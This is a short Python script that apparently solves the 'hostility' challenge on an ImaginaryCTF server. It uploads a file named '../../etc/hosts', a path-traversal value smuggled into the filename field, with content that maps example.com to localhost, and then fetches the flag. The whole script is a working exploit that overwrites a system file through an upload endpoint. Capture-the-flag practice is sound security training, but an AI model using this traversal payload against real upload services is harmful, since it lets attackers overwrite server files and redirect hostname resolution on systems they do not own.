from itertools import count
from time import sleep, time
import requests

res = requests.post(
  "https://hostility.chal.imaginaryctf.org/upload",
  files={'file':("../../etc/hosts", b'127.0.0.1   example.com')}
)

requests.get("https://hostility.chal.imaginaryctf.org/flag")
